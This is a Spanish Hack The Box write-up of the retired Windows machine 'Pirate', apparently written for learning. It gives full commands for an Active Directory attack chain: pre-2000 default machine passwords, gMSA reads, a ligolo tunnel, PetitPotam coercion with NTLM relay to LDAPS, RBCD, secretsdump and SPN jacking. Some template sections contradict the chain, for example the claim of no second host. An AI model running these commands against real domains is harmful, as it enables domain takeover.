---
machine: Pirate
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, pre2k, gmsa, ligolo, petitpotam, rbcd, spn-jacking]
---

# Pirate — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Se arranca con credenciales de *assumed breach* (`pentest`). BloodHound muestra que **Domain Computers** está en **Pre-Windows 2000 Compatible Access**, así que las cuentas de equipo creadas por la vía antigua conservan la contraseña por defecto (nombre en minúsculas): `MS01$:ms01` y `EXCH01$:exch01`. `MS01$` tiene **ReadGMSAPassword** sobre `gMSA_ADFS_prod$`; con ese hash se entra por WinRM al DC, que es un **host Hyper-V** con una red interna donde vive **WEB01** (ADFS, NTLMv1 y WebClient). Coacción con **PetitPotam** + relevo a **LDAPS** → **RBCD** → Administrador en WEB01 → `secretsdump` → `a.white` → `a.white_adm` con delegación restringida y **WriteSPN** → **SPN jacking** al DC → Domain Admin.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389
```

```bash
nxc smb <IP> -u pentest -p '<password>' --shares
bloodhound-python -dc dc01.pirate.htb -d pirate.htb -u pentest -p '<password>' -ns <IP> -c All --zip
```

El DC se llama `DC01`, el dominio `pirate.htb` y el DC tiene **SMB signing activo** pero **LDAP signing no obligatorio**: eso es lo que hará posible el relevo final.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

- Vector de entrada y payload descritos en «Reconocimiento» y «Escalada de privilegios».

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

- Enumeración local y vector de elevación descritos en «Foothold» y «Lecciones aprendidas».

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- Las cuentas Pre-Windows 2000 sin `logonCount` son credenciales gratis; `nxc --pre2k` las encuentra en un minuto.
- Leer una gMSA es leer una identidad de servicio con WinRM: el ACE `ReadGMSAPassword` hay que revisarlo siempre.
- Coacción + relevo a LDAPS sigue vivo mientras LDAP signing no sea obligatorio.
- `secretsdump` en un servidor intermedio suele dar credenciales en claro y, con ellas, el siguiente salto.
- `WriteSPN` sobre el DC combinado con delegación es dominio total: es la versión moderna del *SPN jacking*.
- Detección: 4625 masivos de cuentas de equipo, peticiones LDAP a `msDS-ManagedPassword`, y creación de `msDS-AllowedToActOnBehalfOfOtherIdentity`.

## Mitigaciones y detección

- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.

## Referencias

- [adcs-esc13](../../../knowledge/windows/adcs-esc13.md)
- [gmsa-read-key](../../../knowledge/windows/gmsa-read-key.md)
## Pre-Windows 2000

```bash
nxc ldap dc01.pirate.htb -u '' -p '' --pre2k
```

```text
[+] MS01$:ms01
[+] EXCH01$:exch01
```

Son cuentas de equipo creadas por la vía de compatibilidad y que nunca iniciaron sesión, así que no rotaron la contraseña.

## gMSA

BloodHound marca `MS01$` con **ReadGMSAPassword** sobre `gMSA_ADFS_prod$`:

```bash
nxc ldap dc01.pirate.htb -u 'MS01$' -p 'ms01' --gmsa
```

```text
Account: gMSA_ADFS_prod$   NTLM: <hash>
Account: gMSA_ADCS_prod$   NTLM: <hash>
```

```bash
evil-winrm -i dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H '<hash>'
```

La gMSA tiene acceso WinRM al DC y a WEB01.

## Pivote a la red interna

El DC es también host **Hyper-V** y tiene una segunda interfaz en `192.168.100.0/24`, donde está WEB01.

```bash
# atacante
./proxy -selfcert
# en el DC
.\agent.exe -connect <IP_ATACANTE>:11601 -ignore-cert
# en el proxy: session -> start, y ruta hacia 192.168.100.0/24
```

```bash
nmap -p- 192.168.100.2
```

WEB01 es un servidor **ADFS** con **NTLMv1 habilitado** y el servicio **WebClient** en marcha: las dos condiciones para coaccionar y relevar.

## RBCD por coacción y relevo

```bash
python3 PetitPotam.py -u 'gMSA_ADFS_prod$' -p '<hash>' -hashes :<hash> \
  -d pirate.htb <IP_ESCUCHA> 192.168.100.2
```

```bash
ntlmrelayx.py -t ldaps://dc01.pirate.htb --delegate-access --remove-mic -smb2support
```

El relevo escribe `msDS-AllowedToActOnBehalfOfOtherIdentity` sobre `WEB01$`. Se pide el ticket como Administrator:

```bash
impacket-getST -spn cifs/web01.pirate.htb -impersonate Administrator \
  -dc-ip dc01.pirate.htb 'pirate.htb/gMSA_ADFS_prod$:<hash>'
export KRB5CCNAME=Administrator@cifs_web01.pirate.htb.ccache
impacket-wmiexec -k -no-pass Administrator@web01.pirate.htb
```

## De WEB01 a Domain Admin

```bash
impacket-secretsdump -k -no-pass Administrator@web01.pirate.htb
```

Del volcado salen credenciales en claro (AutoLogon/DefaultPassword) de **`a.white`**, que tiene **ForceChangePassword** sobre **`a.white_adm`**:

```bash
bloodyAD -u a.white -p '<password>' -d pirate.htb --host dc01.pirate.htb \
  set password a.white_adm '<NuevaPassword>!'
```

`a.white_adm` acumula las dos piezas que faltan: **delegación restringida** hacia `HTTP/WEB01` con transición de protocolo y **WriteSPN** sobre `WEB01$` y `DC01$`. Con eso se mueve el SPN delegado al DC (**SPN jacking**) y se pide un ticket para el propio controlador:

```bash
impacket-getST -spn http/web01.pirate.htb -impersonate Administrator \
  -dc-ip dc01.pirate.htb 'pirate.htb/a.white_adm:<NuevaPassword>!'
# con el SPN reescrito hacia el DC, el ticket sirve para cifs/DC01
impacket-secretsdump -k -no-pass Administrator@dc01.pirate.htb
```

Con el hash de Administrator de dominio se leen ambas flags.
